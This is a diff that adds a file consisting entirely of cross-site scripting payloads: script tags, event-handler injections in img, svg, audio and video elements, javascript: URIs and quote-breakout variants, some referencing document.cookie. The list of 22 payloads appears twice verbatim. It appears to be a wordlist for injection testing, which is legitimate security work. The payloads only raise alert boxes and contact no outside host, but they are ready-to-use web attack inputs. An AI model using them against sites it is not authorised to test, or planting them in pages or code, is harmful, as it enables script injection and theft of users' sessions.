@@ -1,1 +1,44 @@
-
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+"><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+"><body onload=alert(1)>
+"><iframe src="javascript:alert(1)"></iframe>
+"><math><mi//xlink:href="javascript:alert(1)"></mi></math>
+"><details open ontoggle=alert(1)>
+"><img/src/onerror=alert(String.fromCharCode(88,83,83))>
+"><svg><script>alert(String.fromCharCode(88,83,83))</script></svg>
+<svg/onload=prompt`XSS`>
+"><audio src=x onerror=alert(1)>
+"><marquee onstart=alert(1)>
+"><input autofocus onfocus=alert(1)>
+"><video><source onerror=alert(1)>
+javascript:alert(1)//
+"><svg/onload=alert(document.domain)>
+'><svg/onload=alert(document.cookie)>
+"><img src=x onerror=alert(document.domain)>
+"><script>confirm('XSS')</script>
+"><svg><animate attributeName="onbegin" begin="alert(1)"/></svg>
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+"><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+"><body onload=alert(1)>
+"><iframe src="javascript:alert(1)"></iframe>
+"><math><mi//xlink:href="javascript:alert(1)"></mi></math>
+"><details open ontoggle=alert(1)>
+"><img/src/onerror=alert(String.fromCharCode(88,83,83))>
+"><svg><script>alert(String.fromCharCode(88,83,83))</script></svg>
+<svg/onload=prompt`XSS`>
+"><audio src=x onerror=alert(1)>
+"><marquee onstart=alert(1)>
+"><input autofocus onfocus=alert(1)>
+"><video><source onerror=alert(1)>
+javascript:alert(1)//
+"><svg/onload=alert(document.domain)>
+'><svg/onload=alert(document.cookie)>
+"><img src=x onerror=alert(document.domain)>
+"><script>confirm('XSS')</script>
+"><svg><animate attributeName="onbegin" begin="alert(1)"/></svg>
